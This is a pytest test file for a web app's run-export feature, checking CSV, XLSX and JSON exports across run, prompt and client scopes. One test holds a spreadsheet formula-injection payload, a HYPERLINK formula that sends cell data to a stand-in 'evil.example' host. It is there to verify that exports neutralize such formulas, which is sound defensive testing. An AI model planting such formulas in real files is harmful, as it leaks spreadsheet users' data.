"""Runs export (docs/TASKS_EXPORT.md) across every scope/format/content-tier combination.

Runs are always created through the real `/prompts/{id}/runs` trigger flow
against FakeAdapter (see `_trigger_run` below) — never inserted directly as
Run/RawResponse rows — so these tests exercise the exact same data shape
the export service sees in production, the same discipline test_runs.py
already follows.
"""

import csv
import io
import json
import zipfile

import pytest
from fastapi.testclient import TestClient
from openpyxl import load_workbook
from sqlalchemy.orm import Session

from app.adapters.base import AdapterCitation, RawResponsePayload
from app.models import Client, Prompt, PromptSet
from app.services.export import EXCEL_CELL_CHAR_LIMIT, RUN_COLUMNS
from tests.fake_adapter import FakeAdapter

EXPORT_MEDIA_TYPES = {
    "csv": "application/zip",
    "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "json": "application/json",
}


def _trigger_run(client: TestClient, prompt_id: int, seed: dict, *, payload: RawResponsePayload | None = None) -> int:
    """POST a run through FakeAdapter (never a real provider) and return the created run id."""
    FakeAdapter.payload_to_return = payload or RawResponsePayload(
        raw_payload={"answer": "test raw payload"},
        rendered_text="Test rendered answer.",
        has_citations=True,
        citations=[
            AdapterCitation(
                source_url="https://example.com/x", source_title="X", source_domain="example.com", citation_position=0
            )
        ],
        token_usage={"input_tokens": 3, "output_tokens": 2},
    )
    response = client.post(
        f"/prompts/{prompt_id}/runs",
        data={"model_id": seed["model"].id, "market_id": seed["market"].id},
        follow_redirects=False,
    )
    assert response.status_code == 303
    return int(response.headers["location"].rsplit("/", 1)[-1])


# --- Run scope ---------------------------------------------------------


@pytest.mark.parametrize("format", ["csv", "xlsx", "json"])
@pytest.mark.parametrize("content", ["answer", "raw", "full"])
def test_run_export_matrix(client: TestClient, seed: dict, sample_prompt: Prompt, format: str, content: str):
    """All 9 format x content combinations return 200 with the right shape."""
    run_id = _trigger_run(client, sample_prompt.id, seed)

    response = client.get(f"/runs/{run_id}/export", params={"format": format, "content": content})

    assert response.status_code == 200
    assert response.headers["content-type"].startswith(EXPORT_MEDIA_TYPES[format])
    assert "attachment" in response.headers["content-disposition"]

    if format == "csv":
        names = zipfile.ZipFile(io.BytesIO(response.content)).namelist()
        assert "runs.csv" in names
        assert "citations.csv" in names
        assert (f"raw_{run_id}.json" in names) == (content in ("raw", "full"))
    elif format == "xlsx":
        sheets = set(load_workbook(io.BytesIO(response.content)).sheetnames)
        assert {"Runs", "Citations"} <= sheets
        assert ("RawPayload" in sheets) == (content in ("raw", "full"))
    else:
        data = json.loads(response.content)
        assert len(data) == 1
        assert ("raw_payload" in data[0]) == (content in ("raw", "full"))
        assert ("rendered_text" in data[0]) == (content in ("answer", "full"))


def test_run_export_404_for_missing_run(client: TestClient):
    response = client.get("/runs/999999/export")
    assert response.status_code == 404
    assert response.json()["error_code"] == "run_not_found"


def test_run_export_xlsx_raw_payload_truncates_at_excel_cell_limit(client: TestClient, seed: dict, sample_prompt: Prompt):
    """A raw_payload that serializes past Excel's ~32,767-char cell limit is truncated, not raised."""
    huge_payload = {"huge_field": "x" * 40000}
    run_id = _trigger_run(
        client,
        sample_prompt.id,
        seed,
        payload=RawResponsePayload(
            raw_payload=huge_payload, rendered_text="short answer", has_citations=False, citations=[], token_usage=None
        ),
    )

    response = client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "raw"})
    assert response.status_code == 200

    raw_sheet = load_workbook(io.BytesIO(response.content))["RawPayload"]
    cell_value = raw_sheet.cell(row=2, column=2).value

    assert len(cell_value) == EXCEL_CELL_CHAR_LIMIT
    assert cell_value.endswith("[truncated — use format=json for full payload]")


def test_run_export_csv_neutralizes_formula_injection(client: TestClient, seed: dict, sample_prompt: Prompt):
    """A rendered_text starting with '=' must not reach runs.csv as a live formula (CSV/formula injection)."""
    formula_payload = '=HYPERLINK("http://evil.example/"&A1,"Click me")'
    run_id = _trigger_run(
        client,
        sample_prompt.id,
        seed,
        payload=RawResponsePayload(
            raw_payload={"answer": formula_payload}, rendered_text=formula_payload, has_citations=False, citations=[], token_usage=None
        ),
    )

    response = client.get(f"/runs/{run_id}/export", params={"format": "csv"})
    zf = zipfile.ZipFile(io.BytesIO(response.content))
    row = next(csv.DictReader(io.StringIO(zf.read("runs.csv").decode())))

    assert row["rendered_text"] == "'" + formula_payload
    assert not row["rendered_text"].startswith(("=", "+", "-", "@"))


def test_run_export_xlsx_strips_control_characters_instead_of_crashing(client: TestClient, seed: dict, sample_prompt: Prompt):
    """A control character in provider output must not crash build_xlsx with openpyxl's IllegalCharacterError."""
    dirty_text = "Answer contains a stray control char: \x01 right here."
    run_id = _trigger_run(
        client,
        sample_prompt.id,
        seed,
        payload=RawResponsePayload(
            raw_payload={"answer": dirty_text}, rendered_text=dirty_text, has_citations=False, citations=[], token_usage=None
        ),
    )

    response = client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "full"})

    assert response.status_code == 200
    wb = load_workbook(io.BytesIO(response.content))
    rendered = wb["Runs"].cell(row=2, column=RUN_COLUMNS.index("rendered_text") + 1).value
    assert "\x01" not in rendered
    assert rendered == "Answer contains a stray control char:  right here."


# --- Prompt scope --------------------------------------------------------


def test_prompt_export_versions_current_vs_all(client: TestClient, seed: dict, sample_prompt: Prompt):
    run_v1 = _trigger_run(client, sample_prompt.id, seed)

    edit_response = client.post(
        f"/prompts/{sample_prompt.id}/edit",
        data={"text": "Updated question text?", "market_id": seed["market"].id, "topic": "", "is_active": "true"},
        follow_redirects=False,
    )
    assert edit_response.status_code == 303
    prompt_v2_id = int(edit_response.headers["location"].rsplit("/", 1)[-1])

    run_v2 = _trigger_run(client, prompt_v2_id, seed)

    current = json.loads(client.get(f"/prompts/{prompt_v2_id}/runs/export", params={"format": "json"}).content)
    assert {row["id"] for row in current} == {run_v2}

    all_versions = json.loads(
        client.get(f"/prompts/{prompt_v2_id}/runs/export", params={"format": "json", "versions": "all"}).content
    )
    assert {row["id"] for row in all_versions} == {run_v1, run_v2}
    assert {row["prompt_version"] for row in all_versions} == {1, 2}


def test_prompt_export_404_for_missing_prompt(client: TestClient):
    response = client.get("/prompts/999999/runs/export")
    assert response.status_code == 404
    assert response.json()["error_code"] == "prompt_not_found"


def test_prompt_export_with_no_runs_is_valid_and_empty(client: TestClient, db_session: Session, seed: dict, sample_prompt: Prompt):
    empty_prompt = Prompt(prompt_set_id=sample_prompt.prompt_set_id, text="Never run", market_id=seed["market"].id)
    db_session.add(empty_prompt)
    db_session.commit()
    db_session.refresh(empty_prompt)

    csv_response = client.get(f"/prompts/{empty_prompt.id}/runs/export", params={"format": "csv"})
    assert csv_response.status_code == 200
    names = zipfile.ZipFile(io.BytesIO(csv_response.content)).namelist()
    assert names == ["runs.csv", "citations.csv"]

    json_response = client.get(f"/prompts/{empty_prompt.id}/runs/export", params={"format": "json"})
    assert json.loads(json_response.content) == []


# --- Client scope --------------------------------------------------------


def test_client_export_spans_multiple_prompt_sets(client: TestClient, db_session: Session, seed: dict, sample_prompt: Prompt):
    run_1 = _trigger_run(client, sample_prompt.id, seed)

    client_id = db_session.get(PromptSet, sample_prompt.prompt_set_id).client_id
    other_set = PromptSet(client_id=client_id, name="Second Set")
    db_session.add(other_set)
    db_session.commit()
    db_session.refresh(other_set)
    other_prompt = Prompt(prompt_set_id=other_set.id, text="Second question?", market_id=seed["market"].id)
    db_session.add(other_prompt)
    db_session.commit()
    db_session.refresh(other_prompt)
    run_2 = _trigger_run(client, other_prompt.id, seed)

    data = json.loads(client.get(f"/clients/{client_id}/runs/export", params={"format": "json"}).content)
    assert {row["id"] for row in data} == {run_1, run_2}
    assert {row["prompt_set_name"] for row in data} == {"Test Set", "Second Set"}


def test_client_export_404_for_missing_client(client: TestClient):
    response = client.get("/clients/999999/runs/export")
    assert response.status_code == 404
    assert response.json()["error_code"] == "client_not_found"


def test_client_export_with_no_runs_is_valid_and_empty(client: TestClient, db_session: Session):
    empty_client = Client(name="Empty Client", slug="empty-client")
    db_session.add(empty_client)
    db_session.commit()
    db_session.refresh(empty_client)

    response = client.get(f"/clients/{empty_client.id}/runs/export", params={"format": "json"})
    assert json.loads(response.content) == []
